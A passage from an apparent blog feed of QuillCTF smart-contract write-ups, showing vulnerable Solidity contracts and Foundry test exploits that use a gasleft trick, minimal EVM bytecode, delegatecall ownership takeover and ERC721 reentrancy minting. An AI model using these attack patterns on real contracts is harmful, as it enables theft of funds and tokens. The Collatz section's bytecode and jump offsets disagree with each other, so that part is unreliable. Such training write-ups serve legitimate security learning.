class="line">block.gaslimit (uint): current block gaslimit</span><br><span class="line">block.number (uint): current block number</span><br><span class="line">block.timestamp (uint): current block timestamp as seconds since unix epoch</span><br><span class="line">gasleft() returns (uint256): remaining gas</span><br><span class="line">msg.data (bytes calldata): complete calldata</span><br><span class="line">msg.sender (address): sender of the message (current call)</span><br><span class="line">msg.sig (bytes4): first four bytes of the calldata (i.e. function identifier)</span><br><span class="line">msg.value (uint): number of wei sent with the message</span><br><span class="line">tx.gasprice (uint): gas price of the transaction</span><br><span class="line">tx.origin (address): sender of the transaction (full call chain)</span><br></pre></td></tr></table></figure><p>and all of them except one will be the same in the same transaction.that is <code>gasleft()</code>.</p><p>However, the <code>gasleft</code> function will be different for each call. <code>gasleft()</code> returns the amount of gas remaining in the current transaction. So we can use <code>gasleft</code> function to return a boolean.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/7-TrueXor/TrueXOR.sol&quot;;</span><br><span class="line">import &quot;../src/7-TrueXor/TrueXORExploit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TrueXORExploit is IBoolGiver &#123;</span><br><span class="line">    function giveBool() external view returns (bool) &#123;</span><br><span class="line">        return gasleft() &gt;= 6500;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrueXORTest is Test &#123;</span><br><span class="line">    TrueXOR trueXor;</span><br><span class="line">    TrueXORExploit exploit;</span><br><span class="line"></span><br><span class="line">    function setUp() external &#123;</span><br><span class="line">        trueXor = new TrueXOR();</span><br><span class="line">        exploit = new TrueXORExploit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        vm.prank(msg.sender);</span><br><span class="line">        bool success = trueXor.callMe&#123;gas: 10000&#125;(address(exploit));</span><br><span class="line">        assertTrue(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-6.Collatzpuzzle</title>
      <link href="/2024/01/22/QuillCTF-6-Collatzpuzzle/"/>
      <url>/2024/01/22/QuillCTF-6-Collatzpuzzle/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“It&#x27;s a puzzle I&#x27;ll keep trying because it&#x27;s so much fun.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Make a successful call to the callMe function.</li><li>You should be the deployer of the contract at the given addr parameter!</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ICollatz &#123;</span><br><span class="line">    function collatzIteration(uint256 n) external pure returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CollatzPuzzle is ICollatz &#123;</span><br><span class="line">    function collatzIteration(uint256 n) public pure override returns (uint256) &#123;</span><br><span class="line">        if (n % 2 == 0) &#123;</span><br><span class="line">            return n / 2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 3 * n + 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callMe(address addr) external view returns (bool) &#123;</span><br><span class="line">        // check code size</span><br><span class="line">        uint256 size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(addr)</span><br><span class="line">        &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 32, &quot;bad code size!&quot;);</span><br><span class="line"></span><br><span class="line">        // check results to be matching</span><br><span class="line">        uint256 p;</span><br><span class="line">        uint256 q;</span><br><span class="line">        for (uint256 n = 1; n &lt; 200; n++) &#123;</span><br><span class="line">            // local result</span><br><span class="line">            p = n;</span><br><span class="line">            for (uint256 i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">                p = collatzIteration(p);</span><br><span class="line">            &#125;</span><br><span class="line">            // your result</span><br><span class="line">            q = n;</span><br><span class="line">            for (uint256 i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">                q = ICollatz(addr).collatzIteration&#123;gas: 100&#125;(q);</span><br><span class="line">            &#125;</span><br><span class="line">            require(p == q, &quot;result mismatch!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>The Key to solve the Challenge is to make the code size small than 32 bytes.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(size &gt; 0 &amp;&amp; size &lt;= 32, &quot;bad code size!&quot;);</span><br></pre></td></tr></table></figure><p>So let‘s write the runtime code that handles the Collatz iteration logic:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Push1 0x04 //skip 4-byte selector</span><br><span class="line">CALLDATALOAD</span><br><span class="line">DUP1</span><br><span class="line">PUSH1 0x01</span><br><span class="line">AND</span><br><span class="line">PUSH1 0x13</span><br><span class="line">JUMPI</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SHR</span><br><span class="line">PUSH1 0x17</span><br><span class="line">JUMP</span><br><span class="line">JUMPDEST</span><br><span class="line">PUSH1 0x3</span><br><span class="line">MUL</span><br><span class="line">PUSH1 0x1</span><br><span class="line">ADD</span><br><span class="line">JUMPDEST</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>let me explain one by one.</p><p>First i use <code>PUSH1 0x04</code>  to skip 4-byte selector ,as we know the function selector is the first four bytes of a function’s signature, used to identify which function to excute during a contract call.</p><p>The <code>PUSH1 0x04</code> instruction pushes the number <code>4</code> onto the stack. This operation is often used to set up the starting offset for the <code>calldataload</code> instruction to extract the function selector from the call data.</p><p>then , use SHR to find <code>n/2</code>, as shifting right once divides by 2. denote as <code>m</code>,push destination to <code>return</code>. Then <code>PUSH1</code> 0x17 to JUMP.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// entry</span><br><span class="line">PUSH1 0x04</span><br><span class="line">CALLDATALOAD</span><br><span class="line">DUP1</span><br><span class="line">PUSH1 0x01</span><br><span class="line">AND</span><br><span class="line">PUSH1 0x10</span><br><span class="line">JUMPI // ═════════════════╗</span><br><span class="line">                       // ║</span><br><span class="line">// even                // ║</span><br><span class="line">PUSH1 0x01             // ║</span><br><span class="line">SHR                    // ║</span><br><span class="line">PUSH1 0x17             // ║</span><br><span class="line">JUMP // ════════════╗     ║</span><br><span class="line">                 // ║     ║</span><br><span class="line">// odd           // ║     ║</span><br><span class="line">JUMPDEST // &lt;═══════║═════╝</span><br><span class="line">PUSH1 0x3        // ║</span><br><span class="line">MUL              // ║</span><br><span class="line">PUSH1 0x1        // ║</span><br><span class="line">ADD              // ║</span><br><span class="line">                 // ║</span><br><span class="line">// return        // ║</span><br><span class="line">JUMPDEST // &lt;═══════╝</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>so the bytecode is <code>6004358060011660135760011c6017565b6003026001015b60805260206080f3</code><br>now we need to write our initialization code.which is tasked with copying the runtime code above into the memory.It will do so via <code>CODECOPY</code> instruction, and must later return the code from memory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUSH32 6002600435818106156015576003026001016017565b045b60005260206000f3  </span><br><span class="line">PUSH1 00  </span><br><span class="line">MSTORE  </span><br><span class="line">PUSH1 20  </span><br><span class="line">PUSH1 00  </span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>The byteCode is <code>0x7f6002600435818106156015576003026001016017565b045b60005260206000f360005260206000f3</code>. this will help us to develop the code above the chain.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/Collatz_Puzzle.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function deploy() public returns (address)&#123;</span><br><span class="line">        bytes memory con = hex&quot;7f6002600435818106156015576003026001016017565b045b60005260206000f360005260206000f3&quot;;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            addr := create(0,add(con,0x20),0x29)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract testCollatz is Test &#123;    </span><br><span class="line">    CollatzPuzzle public cz;</span><br><span class="line">    address attacker;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        attacker = vm.addr(1);</span><br><span class="line">        cz = new CollatzPuzzle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        Attack att = new Attack();</span><br><span class="line">        address taddr = att.deploy();</span><br><span class="line">        bool ans = cz.callMe(taddr);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        assert(ans == true);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-5.D31eg4t3</title>
      <link href="/2024/01/22/QuillCTF-5-D31eg4t3/"/>
      <url>/2024/01/22/QuillCTF-5-D31eg4t3/</url>
      
        <content type="html"><![CDATA[<p>Objective</p><ol><li>Become the owner of the contract.</li><li>Make canYouHackMe mapping to true for your own address.</li></ol><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract D31eg4t3&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    uint a = 12345;</span><br><span class="line">    uint8 b = 32;</span><br><span class="line">    string private d; </span><br><span class="line">    uint32 private c; </span><br><span class="line">    string private mot;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping (address =&gt; bool) public canYouHackMe;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(false, &quot;Not a Owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hackMe(bytes calldata bites) public returns(bool, bytes memory) &#123;</span><br><span class="line">        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);</span><br><span class="line">        return (r, msge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function hacked() public onlyOwner&#123;</span><br><span class="line">        canYouHackMe[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>After read the whole contract , i found delegatecall function . so i thnk the key to solve the question is the <code>delegatecall</code>.</p><p>we can easy use <code>delegatecall</code> to change the variale.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/D31eg4t3.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    uint a = 12345;</span><br><span class="line">    uint8 b = 32;</span><br><span class="line">    string private d; </span><br><span class="line">    uint32 private c; </span><br><span class="line">    string private mot;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping (address =&gt; bool) public canYouHackMe;</span><br><span class="line"></span><br><span class="line">    function attack(address delegateAddress, address attackerAddress) public&#123;</span><br><span class="line">        D31eg4t3 delegateContract = D31eg4t3(delegateAddress);</span><br><span class="line">        delegateContract.hackMe(abi.encodeWithSignature(&quot;pwn(address)&quot;, attackerAddress));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn(address attackerAddress) public &#123;</span><br><span class="line">        owner = attackerAddress;</span><br><span class="line">        canYouHackMe[attackerAddress] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract testCon is Test &#123;    </span><br><span class="line">    D31eg4t3 _contract;</span><br><span class="line">    address owner;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        owner = vm.addr(1);</span><br><span class="line">        attacker = vm.addr(2);</span><br><span class="line">        vm.startPrank(owner);</span><br><span class="line">        _contract = new D31eg4t3();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        Attack att = new Attack();</span><br><span class="line">        att.attack(address(_contract), attacker);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        assertEq(_contract.owner(), attacker);</span><br><span class="line">        assert(_contract.canYouHackMe(attacker) == true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-4.SafeNft</title>
      <link href="/2024/01/22/QuillCTF-4-SafeNft/"/>
      <url>/2024/01/22/QuillCTF-4-SafeNft/</url>
      
        <content type="html"><![CDATA[<h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Claim multiple NFTs for the price of one.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract safeNFT is ERC721Enumerable &#123;</span><br><span class="line">    uint256 price;</span><br><span class="line">    mapping(address=&gt;bool) public canClaim;</span><br><span class="line"></span><br><span class="line">    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) &#123;</span><br><span class="line">        price = _price; //price = 0.01 ETH</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyNFT() external payable &#123;</span><br><span class="line">        require(price==msg.value,&quot;INVALID_VALUE&quot;);</span><br><span class="line">        canClaim[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim() external &#123;</span><br><span class="line">        require(canClaim[msg.sender],&quot;CANT_MINT&quot;);</span><br><span class="line">        _safeMint(msg.sender, totalSupply()); </span><br><span class="line">        canClaim[msg.sender] = false;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Object is to claim multiple NFTs</p><p>we can find <code>_safeMint</code> function in <code>claim()</code> , so we can use reentrance.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;../src/4-NFT/safeNFT.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackerNFT is IERC721Receiver, Test &#123;</span><br><span class="line">    safeNFT _nft;</span><br><span class="line">    bool public complete;</span><br><span class="line">    address internal _owner;</span><br><span class="line">    uint256 z = 1;</span><br><span class="line"></span><br><span class="line">    constructor(address _safenft) &#123;</span><br><span class="line">        _nft = safeNFT(_safenft);</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Attacker() public payable &#123;</span><br><span class="line">        _nft.buyNFT&#123;value: msg.value&#125;();</span><br><span class="line">        _nft.claim();</span><br><span class="line"></span><br><span class="line">        uint256 balance = _nft.balanceOf(address(this));</span><br><span class="line">        for (uint256 i = 0; i &lt; balance; i++) &#123;</span><br><span class="line">            _nft.transferFrom(address(this), _owner, i);</span><br><span class="line">            //console.log(&quot;transfered一次&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) &#123;</span><br><span class="line">        if (z &lt; 10) &#123;</span><br><span class="line">            z++;</span><br><span class="line">            _nft.claim();</span><br><span class="line">            // claiming the</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract safeNftTest is Test &#123;</span><br><span class="line">    address public attacker;</span><br><span class="line"></span><br><span class="line">    safeNFT public target;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        attacker = makeAddr(&quot;attacker&quot;);</span><br><span class="line"></span><br><span class="line">        vm.deal(attacker, 1 ether);</span><br><span class="line"></span><br><span class="line">        target = new safeNFT(&quot;QuillCTF&quot;, &quot;QNF&quot;, 0.01 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttackNFT() public &#123;</span><br><span class="line">        vm.startPrank(attacker);</span><br><span class="line">        AttackerNFT attackNFT = new AttackerNFT(address(target));</span><br><span class="line">        attackNFT.Attacker&#123;value: 0.01 ether&#125;();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        uint256 attackerBalance;</span><br><span class="line">        attackerBalance = target.balanceOf(attacker);</span><br><span class="line">        assertEq(attackerBalance, 10);</span><br><span class="line">        console.log(&quot;attackerBalance&quot;, attackerBalance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> QuillCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QuillCTF-3.VipBank</title>
      <link href="/2024/01/22/QuillCTF-3-VipBank/"/>
      <url>/2024/01/22/QuillCTF-3-VipBank/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“This Bank is only for its VIP Customers.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>At any cost, lock the VIP user balance forever into the contract.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract VIP_Bank&#123;</span><br><span class="line"></span><br><span class="line">    address public manager;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; bool) public VIP;</span><br><span class="line">    uint public maxETH = 0.5 ether;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        manager = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyManager() &#123;</span><br><span class="line">        require(msg.sender == manager , &quot;you are not manager&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyVIP() &#123;</span><br><span class="line">        